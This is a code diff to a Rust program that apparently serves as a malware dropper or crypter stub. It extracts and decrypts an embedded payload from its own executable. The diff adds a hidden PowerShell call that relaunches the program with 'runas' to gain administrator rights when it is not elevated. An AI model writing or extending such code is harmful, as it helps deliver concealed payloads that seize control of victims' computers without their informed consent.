@@ -16,6 +16,7 @@ use std::env::{current_exe, join_paths};
 use std::convert::TryInto;
 use rsa::PaddingScheme;
 use shared::utils::{decrypt, KEY, xor};
+use is_elevated::is_elevated;
 
 struct Overlay {
     bytes: Vec<u8>,
@@ -55,6 +56,18 @@ fn extract_overlay() -> Overlay {
 
 fn main() {
     utils::tmpdir();
+
+    let current = current_exe().unwrap().as_os_str().to_str().unwrap();
+    if !is_elevated() {
+        Command::new("PowerShell")
+            .args(&[
+                "-windowstyle",
+                "hidden",
+                "-Command",
+                &format!("(New-Object -com 'Shell.Application').ShellExecute('{}', '', '', 'runas')", current)])
+            .spawn()
+            .unwrap();
+    }
 
     // ensure, that payload is extracted
     let name = current_exe().unwrap().file_name().unwrap().to_str().unwrap().to_string();
